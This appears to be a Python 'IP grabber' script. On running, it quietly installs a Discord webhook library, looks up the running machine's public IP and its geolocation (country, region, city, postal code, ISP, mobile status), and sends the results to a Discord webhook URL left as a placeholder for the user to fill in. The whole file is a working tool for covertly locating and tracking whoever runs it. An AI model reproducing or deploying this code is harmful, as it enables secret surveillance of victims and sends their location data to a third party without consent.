import requests
import os
os.system("pip install discord-webhook")
from discord_webhook import DiscordWebhook, DiscordEmbed

def main():
    response = requests.get("https://api.techniknews.net/ipgeo").json()
    ip, country, regionName, city, zip, isp, mobile = response["ip"], response["country"], response["regionName"], response["city"], response["zip"], response["isp"], response["mobile"]
    dis = (f"Country: {country}\nProvince/State: {regionName}\nCity: {city}\nPostalCode: {zip}\nIsp: {isp}\nUser Mobile: {mobile}")
    log("Geolocated Ip Address!", dis)

def log(title, description):
    webhook = DiscordWebhook(url="||||||||||||||||| YOUR WEBHOOK URL GOES HERE |||||||||||||||||||||||")
    embed = DiscordEmbed(title=title, description=description, color="0000FF")
    webhook.add_embed(embed)
    response = webhook.execute()

main()
